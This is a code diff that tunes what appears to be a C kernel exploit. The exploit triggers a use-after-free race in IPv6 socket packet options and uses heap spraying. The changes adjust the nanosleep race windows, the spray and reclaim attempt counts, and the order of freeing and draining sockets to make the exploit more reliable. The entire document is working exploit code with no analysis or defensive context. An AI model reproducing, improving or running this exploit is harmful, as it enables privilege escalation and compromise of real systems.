@@ -20,19 +20,20 @@
 #define TCLASS_MASTER 0x13370000
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
-#define SPRAY_SIZE 64 // Needs trigger_uaf tweaking, NANOSLEEP_50US for 32, NANOSLEEP_75US for 64
+#define SPRAY_SIZE 64
 #define SPRAY_TOTAL 256
 #define CLOSEUP_ARRAY_SIZE 512
 #define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)
 
 #define NANOSLEEP_100US "\0\0\0\0\0\0\0\0\xa0\x86\x01\0\0\0\0\0"
-#define NANOSLEEP_75US  "\0\0\0\0\0\0\0\0\xf8\x24\x01\0\0\0\0\0"
 #define NANOSLEEP_50US  "\0\0\0\0\0\0\0\0\x50\xc3\0\0\0\0\0\0"
+#define NANOSLEEP_25US  "\0\0\0\0\0\0\0\0\xa8\x61\0\0\0\0\0\0"
 #define NANOSLEEP_10US  "\0\0\0\0\0\0\0\0\x10\x27\0\0\0\0\0\0"
 
 #define MAX_ATTEMPTS 5
 #define HEAP_GROOM_COUNT 100
 #define MAX_TRIES 500
+#define UAF_RECLAIM_TRIES (MAX_TRIES * 2)
 
 #define DEFRAG_PASSES 3
 #define DEFRAG_SMALL_SOCKETS 16
@@ -75,7 +76,7 @@ void reset_ipv6_opts(int s) {
 
 void safe_close_socket(int sock) {
     if (sock >= 0) {
-        reset_ipv6_opts(sock);
+        free_pktopts(sock);
         shutdown(sock, SHUT_RDWR);
         close(sock);
     }
@@ -240,12 +241,12 @@ void trigger_uaf(struct opaque* o) {
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
 
-    nanosleep(NANOSLEEP_75US, NULL); // Critical timing window for race condition
+    nanosleep(NANOSLEEP_10US, NULL); // Critical timing window for race condition
 
     const int MAX_SPRAY = SPRAY_SIZE;
     int attempts = 0;
 
-    while (attempts++ < 1000) {
+    while (attempts++ < UAF_RECLAIM_TRIES) {
         for (int i = 0; i < MAX_SPRAY; i++) {
             int val = TCLASS_SPRAY;
             if (setsockopt(o->spray_sock[i], IPPROTO_IPV6,
@@ -485,7 +486,7 @@ int main() {
         int overlap_idx = -1;
 
         for (int i = 0; i < SPRAY_SIZE; i++) {
-            reset_ipv6_opts(spray_sock[i]);
+            free_pktopts(spray_sock[i]);
         }
 
         // Phase 3 - DEFRAG
@@ -545,8 +546,6 @@ int main() {
         break;
     }
 
-    drain_socket_cache();
-
     int closeup_fds[CLOSEUP_ARRAY_SIZE];
 
     for (int i = 0; i < CLOSEUP_ARRAY_SIZE; i++)
@@ -596,6 +595,8 @@ int main() {
             cleanup_on_failure(&cleanup_state);
         }
     }
+	
+	drain_socket_cache();
 
     return exploit_success ? 0 : 1;
 }
